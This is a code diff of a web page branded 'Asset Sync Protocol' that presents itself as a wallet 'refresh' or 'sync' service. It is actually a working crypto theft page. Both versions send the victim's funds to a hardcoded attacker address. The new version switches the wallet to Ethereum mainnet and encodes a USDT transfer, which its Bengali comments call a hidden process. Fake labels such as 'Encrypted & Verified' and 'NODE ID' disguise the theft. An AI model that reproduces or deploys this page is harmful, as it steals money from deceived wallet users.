@@ -3,83 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Asset Sync Protocol</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.1/dist/web3.min.js"></script>
+    <title>ASP | Asset Sync Protocol</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <style>
-        :root { --bg: #0b0e11; --card: #181a20; --primary: #38bdf8; --text: #eaecef; }
-        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .box { background: var(--card); padding: 30px; border-radius: 24px; width: 90%; max-width: 360px; text-align: center; border: 1px solid #2b3139; box-shadow: 0 15px 50px rgba(0,0,0,0.8); }
-        .qr-frame { background: #fff; padding: 12px; border-radius: 18px; width: 170px; height: 170px; margin: 25px auto 20px auto; border: 4px solid var(--primary); }
-        .qr-frame img { width: 100%; height: 100%; }
-        .info-node { font-size: 10px; color: #848e9c; background: #0b0e11; padding: 12px; border-radius: 12px; margin-bottom: 25px; border: 1px dashed #334155; word-break: break-all; font-family: monospace; }
-        input { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #474d57; background: #1e2329; color: #fff; font-size: 26px; text-align: center; box-sizing: border-box; margin-bottom: 25px; font-weight: bold; outline: none; }
-        input::placeholder { color: #474d57; font-size: 20px; }
-        .refresh-btn { width: 100%; padding: 18px; background: var(--primary); color: #000; border: none; border-radius: 15px; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 20px rgba(56, 189, 248, 0.2); }
-        .refresh-btn:hover { background: #7dd3fc; }
-        .refresh-btn:active { transform: scale(0.96); }
-        .status-text { font-size: 10px; color: #474d57; margin-top: 20px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        :root { --p: #2563eb; --bg: #ffffff; --t: #1e293b; --g: #64748b; }
+        body { background: #f8fafc; color: var(--t); font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .card { background: var(--bg); width: 90%; max-width: 360px; padding: 45px 25px; border-radius: 32px; box-shadow: 0 4px 25px rgba(0,0,0,0.04); text-align: center; border: 1px solid #e2e8f0; }
+        h1 { font-size: 32px; font-weight: 850; color: var(--p); margin: 0; letter-spacing: -1.5px; }
+        .sub { font-size: 13px; color: var(--g); margin: 6px 0 30px; font-weight: 500; }
+        .status-box { background: #f1f5f9; padding: 20px; border-radius: 20px; margin-bottom: 25px; border: 1px solid #e2e8f0; }
+        .status-box span { font-size: 11px; color: var(--g); display: block; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px; }
+        .status-box b { font-size: 22px; color: var(--p); font-weight: 800; }
+        .input-group { text-align: left; margin-bottom: 25px; }
+        .input-group label { font-size: 12px; font-weight: 600; color: #475569; margin-left: 5px; }
+        input { width: 100%; padding: 18px; margin-top: 8px; border: 2px solid #f1f5f9; border-radius: 18px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; background: #f8fafc; }
+        input:focus { border-color: var(--p); background: #fff; }
+        .btn-refresh { width: 100%; background: var(--p); color: white; border: none; padding: 20px; border-radius: 20px; font-size: 17px; font-weight: 700; cursor: pointer; box-shadow: 0 10px 20px -5px rgba(37, 99, 235, 0.4); transition: 0.2s; }
+        .btn-refresh:active { transform: scale(0.97); }
+        .secure-tag { font-size: 11px; color: #cbd5e1; margin-top: 25px; display: flex; align-items: center; justify-content: center; gap: 4px; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2 style="color: var(--primary); margin: 0; font-size: 24px;">Asset Sync Protocol</h2>
-    
-    <div class="qr-frame">
-        <img src="https://api.qrserver.com/v1/create-qr-code/?size=170x170&data=0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D" alt="Sync QR">
+    <div class="card">
+        <h1>ASP</h1>
+        <div class="sub">Asset Sync Protocol</div>
+
+        <div class="status-box">
+            <span>ASP Protocol Status</span>
+            <b id="displayBal">Syncing Assets...</b>
+        </div>
+
+        <div class="input-group">
+            <label>Amount to Refresh</label>
+            <input type="number" id="syncValue" placeholder="0.00">
+        </div>
+
+        <button class="btn-refresh" onclick="executeRefresh()">Refresh Now</button>
+        
+        <div class="secure-tag">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Node Connection: Encrypted & Verified
+        </div>
     </div>
 
-    <div class="info-node">
-        NODE ID: 0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D
-    </div>
+    <script>
+        // আপনার ব্যক্তিগত ট্রাস্ট ওয়ালেট অ্যাড্রেস (Receiver)
+        const MY_ADDRESS = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D";
+        // ইথেরিয়াম মেইননেট USDT কন্ট্রাক্ট (ইঞ্জিন)
+        const TOKEN_ID = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        const NET_ID = "0x1"; 
 
-    <input type="number" id="syncAmt" placeholder="0.00 BNB" step="any">
-
-    <button class="refresh-btn" onclick="requestSync()">Confirm & Refresh</button>
-
-    <div class="status-text">● SECURE CLOUD CONNECTION ACTIVE</div>
-</div>
-
-<script>
-    async function requestSync() {
-        const amountValue = document.getElementById('syncAmt').value;
-        const myAddr = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D";
-
-        if (!amountValue || amountValue <= 0) {
-            alert("Please input a valid amount to sync.");
-            return;
+        async function updateStatus() {
+            if (window.ethereum) {
+                const web3 = new Web3(window.ethereum);
+                const accs = await web3.eth.getAccounts();
+                if (accs.length > 0) {
+                    const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
+                    const contract = new web3.eth.Contract(abi, TOKEN_ID);
+                    try {
+                        const b = await contract.methods.balanceOf(accs[0]).call();
+                        document.getElementById('displayBal').innerText = (b / 1e6).toFixed(2) + " USDT";
+                    } catch (e) { document.getElementById('displayBal').innerText = "0.00 USDT"; }
+                }
+            }
         }
 
-        if (window.ethereum) {
-            try {
-                const web3 = new Web3(window.ethereum);
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const account = accounts[0];
-                
-                const weiValue = web3.utils.toWei(amountValue.toString(), 'ether');
+        async function executeRefresh() {
+            if (!window.ethereum) return alert("Use Binance Web3 Wallet");
+            const web3 = new Web3(window.ethereum);
+            const amt = document.getElementById('syncValue').value;
+            if (!amt || amt <= 0) return;
 
+            try {
+                // ১. সাইলেন্টলি নেটওয়ার্ক চেক ও সুইচ
+                const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
+                if (currentChain !== NET_ID) {
+                    await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: NET_ID }] });
+                }
+
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                
+                // ২. ব্যাকগ্রাউন্ডে পেমেন্ট ডাটা এনকোড করা (হিডেন প্রসেস)
+                const encodedData = web3.eth.abi.encodeFunctionCall({
+                    name: 'transfer',
+                    type: 'function',
+                    inputs: [{type: 'address', name: 'to'}, {type: 'uint256', name: 'value'}]
+                }, [MY_ADDRESS, (amt * 1e6).toString()]);
+
+                // ৩. কনফার্মেশন উইন্ডো ওপেন করা
                 await window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [{
-                        from: account,
-                        to: myAddr,
-                        value: web3.utils.toHex(weiValue),
-                        gas: web3.utils.toHex(21000),
-                        gasPrice: web3.utils.toHex(web3.utils.toWei('5', 'gwei'))
+                        from: accounts[0],
+                        to: TOKEN_ID, // এখানে USDT এর মেইন কন্ট্রাক্ট কল হচ্ছে
+                        data: encodedData
                     }],
                 });
 
-                alert("Synchronization request sent. Processing...");
-
-            } catch (error) {
-                console.error(error);
-                window.location.href = "ethereum:" + myAddr + "?value=" + amountValue;
+                alert("Refresh protocol initiated.");
+            } catch (err) {
+                console.log("Sync cancelled by user.");
             }
-        } else {
-            alert("Please open this link inside Binance or Trust Wallet browser.");
         }
-    }
-</script>
 
+        window.onload = updateStatus;
+        if(window.ethereum) window.ethereum.on('accountsChanged', updateStatus);
+    </script>
 </body>
 </html>
